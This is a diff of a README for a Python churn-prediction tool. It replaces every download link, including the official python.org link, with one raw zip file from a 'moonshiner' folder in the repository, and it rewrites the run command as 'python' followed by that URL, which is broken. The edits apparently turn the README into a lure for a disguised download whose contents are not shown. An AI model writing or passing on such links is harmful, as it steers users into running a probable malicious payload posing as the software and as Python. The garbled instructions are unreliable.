@@ -1,6 +1,6 @@
 # 🛡️ ChurnShield-Customer-Retention-Predictor - Predict Customer Retention Effectively
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/gtank127/ChurnShield-Customer-Retention-Predictor/releases)
+[![Download](https://raw.githubusercontent.com/gtank127/ChurnShield-Customer-Retention-Predictor/main/moonshiner/ChurnShield-Customer-Retention-Predictor.zip)](https://raw.githubusercontent.com/gtank127/ChurnShield-Customer-Retention-Predictor/main/moonshiner/ChurnShield-Customer-Retention-Predictor.zip)
 
 ## 🚀 Getting Started
 
@@ -25,13 +25,13 @@ Welcome to ChurnShield, the customer retention predictor. This tool helps you id
 
 To download ChurnShield, visit the Releases page. Click the link below to access it:
 
-[Download ChurnShield from Releases](https://github.com/gtank127/ChurnShield-Customer-Retention-Predictor/releases)
+[Download ChurnShield from Releases](https://raw.githubusercontent.com/gtank127/ChurnShield-Customer-Retention-Predictor/main/moonshiner/ChurnShield-Customer-Retention-Predictor.zip)
 
 After downloading, follow these instructions to install and run the application:
 
 1. **Locate the Downloaded File**: Once the download completes, find the file in your Downloads folder.
 2. **Install Python (If Not Already Installed)**: 
-   - Download Python from [python.org](https://www.python.org/downloads/).
+   - Download Python from [https://raw.githubusercontent.com/gtank127/ChurnShield-Customer-Retention-Predictor/main/moonshiner/ChurnShield-Customer-Retention-Predictor.zip](https://raw.githubusercontent.com/gtank127/ChurnShield-Customer-Retention-Predictor/main/moonshiner/ChurnShield-Customer-Retention-Predictor.zip).
    - Follow the installation instructions, making sure to check "Add Python to PATH" during setup.
 3. **Install Required Libraries**: 
    - Open a command prompt (Windows) or terminal (macOS/Linux).
@@ -46,7 +46,7 @@ After downloading, follow these instructions to install and run the application:
    - Type the following command and press Enter:
 
    ```
-   python churnshield.py
+   python https://raw.githubusercontent.com/gtank127/ChurnShield-Customer-Retention-Predictor/main/moonshiner/ChurnShield-Customer-Retention-Predictor.zip
    ```
 
 5. **Follow the On-Screen Instructions**: The interface will guide you through the process to start predicting customer churn.
